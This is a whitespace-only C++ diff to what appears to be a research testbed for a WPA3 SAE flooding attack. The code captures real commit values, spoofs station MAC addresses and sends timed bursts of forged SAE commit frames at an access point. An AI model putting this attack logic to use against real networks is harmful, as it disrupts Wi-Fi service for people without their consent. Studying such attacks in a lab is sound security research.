@@ -31,9 +31,9 @@ static vector<HWAddress<6>> build_mac_pool(RunStatus &rs, const int pool_size, c
 
 		if(static_cast<int>(pool.size()) < pool_size) {
 			log(LogLevel::WARNING,
-					"Only {} connected STAs available (need {}), padding with random MACs",
-					pool.size(),
-					pool_size);
+				"Only {} connected STAs available (need {}), padding with random MACs",
+				pool.size(),
+				pool_size);
 			while(static_cast<int>(pool.size()) < pool_size)
 				pool.emplace_back(firmware::get_random_ath_masker_mac(attacker_mac));
 		} else {
@@ -55,7 +55,7 @@ void run_attack(RunStatus &rs) {
 	// Capture real scalar+element via wpa_supplicant before switching to monitor
 	log(LogLevel::INFO, "Capturing SAE commit values...");
 	const optional<sae_helper::SAEPair> sae_params = cookie_guzzler::get_commit_values(
-			rs, attacker.get(SK::iface), attacker.get_mon_iface(), hostapd::get_ssid(rs, "ap"), ap.get(SK::mac), 30);
+		rs, attacker.get(SK::iface), attacker.get_mon_iface(), hostapd::get_ssid(rs, "ap"), ap.get(SK::mac), 30);
 
 	if(!sae_params.has_value()) throw run_err("Failed to capture SAE commit values");
 
@@ -87,12 +87,12 @@ void run_attack(RunStatus &rs) {
 	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
 	rs.process_manager.write_log_all(ATTACK_START_tag);
 	dos_helpers::timed_burst(
-			sender, attack_time, static_cast<size_t>(burst_size), 10'000'000UL, [&]() -> optional<RadioTap> {
-				const auto &sta_mac = mac_pool[mac_idx % mac_pool.size()];
-				mac_idx++;
-				sae_params->group_id = random_dh ? DH_GROUPS[group_dist(rng)] : DH_GROUPS[0];
-				return make_sae_commit(ap.get(SK::mac), sta_mac, sae_params.value());
-			});
+		sender, attack_time, static_cast<size_t>(burst_size), 10'000'000UL, [&]() -> optional<RadioTap> {
+			const auto &sta_mac = mac_pool[mac_idx % mac_pool.size()];
+			mac_idx++;
+			sae_params->group_id = random_dh ? DH_GROUPS[group_dist(rng)] : DH_GROUPS[0];
+			return make_sae_commit(ap.get(SK::mac), sta_mac, sae_params.value());
+		});
 	rs.process_manager.write_log_all(ATTACK_STOP_tag);
 	interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));
 	ap->disconnect();
